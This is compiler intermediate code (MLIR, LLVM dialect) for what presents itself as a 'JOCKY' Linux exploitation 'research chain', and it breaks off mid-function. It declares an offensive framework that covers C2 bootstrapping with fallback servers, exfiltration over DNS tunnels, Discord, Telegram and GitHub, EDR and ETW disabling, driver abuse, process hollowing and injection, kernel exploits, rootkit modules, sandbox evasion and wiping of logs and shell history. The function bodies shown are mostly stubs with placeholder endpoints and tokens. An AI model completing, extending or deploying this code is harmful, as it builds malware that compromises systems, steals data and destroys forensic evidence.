module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr<270> = dense<32> : vector<4xi64>, !llvm.ptr<271> = dense<32> : vector<4xi64>, !llvm.ptr<272> = dense<64> : vector<4xi64>, i64 = dense<64> : vector<2xi64>, f80 = dense<128> : vector<2xi64>, !llvm.ptr = dense<64> : vector<4xi64>, i1 = dense<8> : vector<2xi64>, i8 = dense<8> : vector<2xi64>, i16 = dense<16> : vector<2xi64>, i32 = dense<32> : vector<2xi64>, f16 = dense<16> : vector<2xi64>, f64 = dense<64> : vector<2xi64>, f128 = dense<128> : vector<2xi64>, "dlti.endianness" = "little", "dlti.mangling_mode" = "e", "dlti.legal_int_widths" = array<i32: 8, 16, 32, 64>, "dlti.stack_alignment" = 128 : i64>, llvm.module_asm = [], llvm.target_triple = "x86_64-unknown-linux-gnu"} {
  llvm.mlir.global private constant @".str.0"("[*] Bootstrapping from C2 command & control server...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.1"("JOCKY_C2_PRIMARY_PLACEHOLDER\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.2"(dense<0> : tensor<1xi8>) {addr_space = 0 : i32, dso_local} : !llvm.array<1 x i8>
  llvm.mlir.global private constant @".str.3"("    [+] Primary C2 responded successfully\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.4"("    [+] Configuration loaded from C2\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.5"("    [-] Primary C2 failed, trying fallback...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.6"("JOCKY_C2_FALLBACK_PLACEHOLDER\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.7"("    [+] Fallback C2 responded\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.8"("    [+] Configuration loaded from fallback C2\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.9"("    [-] Both C2 servers unreachable, using hardcoded fallback\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.10"("https://10.0.2.2:8443/upload\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.11"("Bearer fallback_token_no_c2_available\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.12"("/tmp/.jocky_model\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.13"("        Querying: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.14"("Bearer injected_production_token_v2\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.15"("[*] Checking model availability...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.16"("    [+] Model found locally: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.17"(" bytes\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.18"("    [-] Model not found locally, attempting download...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.19"("JOCKY_MODEL_REPO_PLACEHOLDER\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.20"("phi3_evasion_linux.gguf\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.21"("        Downloading from: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.22"("    [+] Model download initiated\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.23"("[*] Caching configuration locally...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.24"("    [+] Config cached to: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.25"("/tmp/.jocky_config\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.26"("[*] Loading cached configuration...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.27"("https://cached.endpoint/upload\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.28"("Bearer cached_token\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.29"("=== JOCKY Linux Research Chain v3 - Production ===\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.30"("Build ID: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.31"("JOCKY_BUILD_ID_PLACEHOLDER\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.32"("[*] Attempting to load cached configuration...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.33"("[-] No cached config available, using hardcoded fallback\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.34"("[-] Failed to obtain model, continuing without AI scoring\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.35"("[+] Configuration Summary:\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.36"("    CDN Endpoint: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.37"("    Model Path: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.38"("    Build: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.39"("[*] Starting exploitation research chain...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.40"("    - Kernel exploitation chain: KFENCE UAF, DIRTYCOW, PERF_EVENT\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.41"("    - eBPF instrumentation: 4 hooks deployed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.42"("    - LKM rootkit chain: 3 modules in fallback order\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.43"("    - Exfiltration: CDN, DNS tunnel, Discord webhook\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.44"("    - Forensics: Comprehensive cleanup enabled\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.45"("[+] All systems initialized and ready\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.46"("[*] Exfiltration endpoint: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.47"("[*] Auth token: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.48"("=== Research chain ready for deployment ===\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global external @C2_PRIMARY() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @C2_FALLBACK() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @MODEL_REPO() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @BUILD_ID() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @LOCAL_MODEL_PATH() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @LOCAL_CONFIG_PATH() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @cdn_endpoint() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @cdn_token() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @model_path() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @c2_config_fresh(false) {addr_space = 0 : i32} : i1
  llvm.func @puts(!llvm.ptr) -> i32
  llvm.func @printf(!llvm.ptr, ...) -> i32
  llvm.func @println(!llvm.ptr)
  llvm.func @string(i64) -> !llvm.ptr
  llvm.func @jocky_str_concat(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @malloc(i64) -> !llvm.ptr
  llvm.func @free(!llvm.ptr)
  llvm.func @memset(!llvm.ptr, i32, i64) -> !llvm.ptr
  llvm.func @memcpy(!llvm.ptr, !llvm.ptr, i64) -> !llvm.ptr
  llvm.func @strlen(!llvm.ptr) -> i64
  llvm.func @exit(i32)
  llvm.func @array_len(!llvm.ptr) -> i64
  llvm.func @array_append(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_alloc(i64) -> !llvm.ptr
  llvm.func @jocky_free(!llvm.ptr)
  llvm.func @jocky_byovd_new() -> !llvm.ptr
  llvm.func @jocky_byovd_destroy(!llvm.ptr)
  llvm.func @jocky_runtime_init() -> i32
  llvm.func @jocky_check_analysis_environment() -> i32
  llvm.func @jocky_is_debugger_present() -> i1
  llvm.func @jocky_is_vm() -> i1
  llvm.func @jocky_is_sandbox() -> i1
  llvm.func @jocky_sleep_and_recheck()
  llvm.func @jocky_decrypt_xor(!llvm.ptr, i32, i8, i32)
  llvm.func @jocky_decrypt_rc4(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_unhook_ntdll() -> i1
  llvm.func @jocky_get_syscall_number(!llvm.ptr) -> i32
  llvm.func @jocky_spoof_call(!llvm.ptr, i64, i64, i64, i64) -> i64
  llvm.func @jocky_spoof_syscall(i32, i64, i64, i64, i64) -> i64
  llvm.func @jocky_byovd_load(!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_byovd_unload(!llvm.ptr)
  llvm.func @jocky_driver_read_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_write_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_map_kernel(!llvm.ptr, i64, i32) -> !llvm.ptr
  llvm.func @jocky_kread(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_kwrite(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_disable_edr_callbacks(!llvm.ptr) -> i32
  llvm.func @jocky_disable_etw(!llvm.ptr) -> i1
  llvm.func @jocky_elevate_token(!llvm.ptr, i32) -> i1
  llvm.func @jocky_process_hollow(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_module_stomp(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_rdll_inject(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_thread_hijack(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_encrypt(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_exfil_front(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_dns(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_discord(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_telegram(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_github(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_self_delete()
  llvm.func @jocky_clear_logs()
  llvm.func @jocky_wipe_artifacts(!llvm.ptr)
  llvm.func @jocky_wipe_prefetch()
  llvm.func @jocky_patch_shimcache() -> i1
  llvm.func @jocky_patch_amcache() -> i1
  llvm.func @jocky_clear_srum() -> i1
  llvm.func @jocky_cleanup_all()
  llvm.func @forensics_wipe_powershell_history() -> i32
  llvm.func @forensics_wipe_cmd_history() -> i32
  llvm.func @forensics_flush_arp_cache() -> i32
  llvm.func @forensics_clear_dns_cache() -> i32
  llvm.func @linux_forensics_wipe_bash_history() -> i32
  llvm.func @jocky_linux_cleanup_syslog() -> i32
  llvm.func @jocky_linux_cleanup_journal() -> i32
  llvm.func @jocky_cleanup_event_logs(!llvm.ptr) -> i32
  llvm.func @jocky_cleanup_usn_journal() -> i32
  llvm.func @fs_exists(!llvm.ptr) -> i1
  llvm.func @fs_list_files(!llvm.ptr, i1) -> !llvm.ptr
  llvm.func @fs_file_size(!llvm.ptr) -> i64
  llvm.func @fs_read_file(!llvm.ptr) -> !llvm.ptr
  llvm.func @fs_write_file(!llvm.ptr, !llvm.ptr, i64) -> i1
  llvm.func @crypto_generate_key(i32) -> !llvm.ptr
  llvm.func @crypto_aes256_encrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @crypto_aes256_decrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @sandbox_spawn(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @sandbox_set_limits(i32, i64, i32, i64) -> i1
  llvm.func @sandbox_monitor(i32) -> i32
  llvm.func @sandbox_wait(i32) -> i32
  llvm.func @sandbox_export_trace(i32, !llvm.ptr) -> i1
  llvm.func @jocky_registry_create_key(i32, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_registry_set_value(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32, i32) -> i1
  llvm.func @jocky_registry_close_key(!llvm.ptr) -> i1
  llvm.func @audit_log(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @audit_init(i32) -> i1
  llvm.func @audit_export(!llvm.ptr) -> i1
  llvm.func @audit_verify() -> i32
  llvm.func @provenance_record(!llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @ai_init() -> i32
  llvm.func @ai_collect_telemetry() -> !llvm.ptr
  llvm.func @ai_score_threat() -> f64
  llvm.func @byovd_load_driver(!llvm.ptr) -> i32
  llvm.func @byovd_test_exploit(i32) -> i32
  llvm.func @btr_disable_notifications() -> i1
  llvm.func @btr_mask_module(!llvm.ptr) -> i1
  llvm.func @jocky_exploit_disable_callbacks() -> i32
  llvm.func @jocky_exploit_token_replacement(i32, i32) -> i32
  llvm.func @edrhoker_detect() -> i1
  llvm.func @blindside_unhook_ntdll() -> i1
  llvm.func @exfil_dns_tunnel(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_discord_webhook(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_local_cdn(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_module_load(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_module_unload(!llvm.ptr) -> i1
  llvm.func @jocky_module_has_symbol(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_module_base(!llvm.ptr) -> i64
  llvm.func @jocky_module_resolve_symbol(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_process_hollow_linux(i32, !llvm.ptr, i64) -> i1
  llvm.func @jocky_process_ptrace_attach(i32) -> i32
  llvm.func @jocky_process_ptrace_detach(i32) -> i32
  llvm.func @jocky_process_get_maps(i32, !llvm.ptr, i64) -> i32
  llvm.func @jocky_fence2pwn_detect_kfence() -> i32
  llvm.func @jocky_fence2pwn_get_pool_info(!llvm.ptr) -> i32
  llvm.func @jocky_fence2pwn_trigger_allocations(i64, i32) -> i32
  llvm.func @jocky_fence2pwn_exploit_uaf(i32, i32, !llvm.ptr) -> i32
  llvm.func @jocky_fence2pwn_manipulate_creds(i32, i32) -> i32
  llvm.func @jocky_fence2pwn_allocate_cred_objects(i32) -> i32
  llvm.func @jocky_fence2pwn_write_cred(!llvm.ptr, i32, i32) -> i32
  llvm.func @jocky_fence2pwn_trigger_reclamation() -> i32
  llvm.func @jocky_fence2pwn_elevate_to_root() -> i32
  llvm.func @jocky_fence2pwn_find_uaf_primitive() -> i32
  llvm.func @jocky_ebpf_load(!llvm.ptr, i32, i32) -> i32
  llvm.func @jocky_ebpf_attach(i32, i32, i32) -> i32
  llvm.func @jocky_ebpf_run(i32, !llvm.ptr, i32) -> i64
  llvm.func @jocky_lkm_load(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_lkm_unload(!llvm.ptr) -> i32
  llvm.func @jocky_lkm_get_symbol(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_syscall_hook(i32, !llvm.ptr) -> i32
  llvm.func @jocky_syscall_unhook(i32) -> i32
  llvm.func @jocky_syscall_trace(i32) -> i32
  llvm.func @jocky_ftrace_attach(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_ftrace_detach(!llvm.ptr) -> i32
  llvm.func @bootstrap_from_c2() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.0" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.1" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.2" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.3" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.5" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.7" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.9" : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.10" : !llvm.ptr
    %11 = llvm.mlir.addressof @cdn_endpoint : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.11" : !llvm.ptr
    %13 = llvm.mlir.addressof @cdn_token : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.12" : !llvm.ptr
    %15 = llvm.mlir.addressof @model_path : !llvm.ptr
    %16 = llvm.mlir.constant(false) : i1
    %17 = llvm.mlir.addressof @".str.8" : !llvm.ptr
    %18 = llvm.mlir.constant(true) : i1
    %19 = llvm.mlir.addressof @c2_config_fresh : !llvm.ptr
    %20 = llvm.mlir.addressof @".str.4" : !llvm.ptr
    %21 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %22 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %23 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<54 x i8>
    llvm.call @println(%23) : (!llvm.ptr) -> ()
    %24 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %25 = llvm.call @fetch_c2_config(%24) : (!llvm.ptr) -> !llvm.ptr
    llvm.store %25, %21 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %26 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %27 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %28 = llvm.icmp "ne" %26, %27 : !llvm.ptr
    llvm.cond_br %28, ^bb1, ^bb4
  ^bb1:  // pred: ^bb0
    %29 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<42 x i8>
    llvm.call @println(%29) : (!llvm.ptr) -> ()
    %30 = llvm.load %21 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %31 = llvm.call @parse_c2_config(%30) : (!llvm.ptr) -> i1
    llvm.cond_br %31, ^bb2, ^bb3
  ^bb2:  // pred: ^bb1
    %32 = llvm.getelementptr %20[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%32) : (!llvm.ptr) -> ()
    llvm.store %18, %19 {alignment = 1 : i64} : i1, !llvm.ptr
    llvm.return %18 : i1
  ^bb3:  // pred: ^bb1
    llvm.br ^bb4
  ^bb4:  // 2 preds: ^bb0, ^bb3
    %33 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<46 x i8>
    llvm.call @println(%33) : (!llvm.ptr) -> ()
    %34 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    %35 = llvm.call @fetch_c2_config(%34) : (!llvm.ptr) -> !llvm.ptr
    llvm.store %35, %22 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %36 = llvm.load %22 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %37 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %38 = llvm.icmp "ne" %36, %37 : !llvm.ptr
    llvm.cond_br %38, ^bb5, ^bb8
  ^bb5:  // pred: ^bb4
    %39 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    llvm.call @println(%39) : (!llvm.ptr) -> ()
    %40 = llvm.load %22 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %41 = llvm.call @parse_c2_config(%40) : (!llvm.ptr) -> i1
    llvm.cond_br %41, ^bb6, ^bb7
  ^bb6:  // pred: ^bb5
    %42 = llvm.getelementptr %17[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<46 x i8>
    llvm.call @println(%42) : (!llvm.ptr) -> ()
    llvm.store %18, %19 {alignment = 1 : i64} : i1, !llvm.ptr
    llvm.return %18 : i1
  ^bb7:  // pred: ^bb5
    llvm.br ^bb8
  ^bb8:  // 2 preds: ^bb4, ^bb7
    %43 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<62 x i8>
    llvm.call @println(%43) : (!llvm.ptr) -> ()
    %44 = llvm.getelementptr %10[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.store %44, %11 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %45 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<38 x i8>
    llvm.store %45, %13 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %46 = llvm.getelementptr %14[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    llvm.store %46, %15 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.return %16 : i1
  }
  llvm.func @fetch_c2_config(%arg0: !llvm.ptr) -> !llvm.ptr {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.13" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.2" : !llvm.ptr
    %4 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg0, %4 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %5 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<19 x i8>
    %6 = llvm.load %4 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %7 = llvm.call @jocky_str_concat(%5, %6) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%7) : (!llvm.ptr) -> ()
    %8 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    llvm.return %8 : !llvm.ptr
  }
  llvm.func @parse_c2_config(%arg0: !llvm.ptr) -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.10" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @cdn_endpoint : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.14" : !llvm.ptr
    %5 = llvm.mlir.addressof @cdn_token : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.12" : !llvm.ptr
    %7 = llvm.mlir.addressof @model_path : !llvm.ptr
    %8 = llvm.mlir.constant(true) : i1
    %9 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    llvm.store %arg0, %9 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %10 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    llvm.store %10, %3 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %11 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<36 x i8>
    llvm.store %11, %5 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %12 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    llvm.store %12, %7 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.return %8 : i1
  }
  llvm.func @ensure_model_available() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.15" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.2" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.18" : !llvm.ptr
    %5 = llvm.mlir.addressof @".str.19" : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.20" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.21" : !llvm.ptr
    %8 = llvm.mlir.addressof @".str.22" : !llvm.ptr
    %9 = llvm.mlir.addressof @".str.12" : !llvm.ptr
    %10 = llvm.mlir.addressof @model_path : !llvm.ptr
    %11 = llvm.mlir.constant(true) : i1
    %12 = llvm.mlir.addressof @".str.16" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.17" : !llvm.ptr
    %14 = llvm.alloca %0 x i64 {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %15 = llvm.alloca %0 x !llvm.ptr {alignment = 8 : i64} : (i32) -> !llvm.ptr
    %16 = llvm.getelementptr %1[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<35 x i8>
    llvm.call @println(%16) : (!llvm.ptr) -> ()
    %17 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %18 = llvm.call @fs_exists(%17) : (!llvm.ptr) -> i1
    llvm.cond_br %18, ^bb1, ^bb2
  ^bb1:  // pred: ^bb0
    %19 = llvm.getelementptr %3[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<1 x i8>
    %20 = llvm.call @fs_file_size(%19) : (!llvm.ptr) -> i64
    llvm.store %20, %14 {alignment = 8 : i64} : i64, !llvm.ptr
    %21 = llvm.getelementptr %12[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<30 x i8>
    %22 = llvm.load %14 {alignment = 8 : i64} : !llvm.ptr -> i64
    %23 = llvm.call @string(%22) : (i64) -> !llvm.ptr
    %24 = llvm.call @jocky_str_concat(%21, %23) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    %25 = llvm.getelementptr %13[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<7 x i8>
    %26 = llvm.call @jocky_str_concat(%24, %25) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%26) : (!llvm.ptr) -> ()
    llvm.return %11 : i1
  ^bb2:  // pred: ^bb0
    %27 = llvm.getelementptr %4[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<56 x i8>
    llvm.call @println(%27) : (!llvm.ptr) -> ()
    %28 = llvm.getelementptr %5[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<29 x i8>
    %29 = llvm.getelementptr %6[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<24 x i8>
    %30 = llvm.call @jocky_str_concat(%28, %29) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.store %30, %15 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    %31 = llvm.getelementptr %7[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
    %32 = llvm.load %15 {alignment = 8 : i64} : !llvm.ptr -> !llvm.ptr
    %33 = llvm.call @jocky_str_concat(%31, %32) : (!llvm.ptr, !llvm.ptr) -> !llvm.ptr
    llvm.call @println(%33) : (!llvm.ptr) -> ()
    %34 = llvm.getelementptr %8[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<33 x i8>
    llvm.call @println(%34) : (!llvm.ptr) -> ()
    %35 = llvm.getelementptr %9[%2, %2] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<18 x i8>
    llvm.store %35, %10 {alignment = 8 : i64} : !llvm.ptr, !llvm.ptr
    llvm.return %11 : i1
  }
  llvm.func @save_config_locally() -> i1 {
    %0 = llvm.mlir.addressof @".str.23" : !llvm.ptr
    %1 = llvm.mlir.constant(0 : i32) : i32
    %2 = llvm.mlir.addressof @".str.24" : !llvm.ptr
    %3 = llvm.mlir.addressof @".str.25" : !llvm.ptr
    %4 = llvm.mlir.constant(true) : i1
    %5 = llvm.getelementptr %0[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<37 x i8>
    llvm.call @println(%5) : (!llvm.ptr) -> ()
    %6 = llvm.getelementptr %2[%1, %1] : (!llvm.ptr, i32, i32) -> !llvm.ptr, !llvm.array<27 x i8>
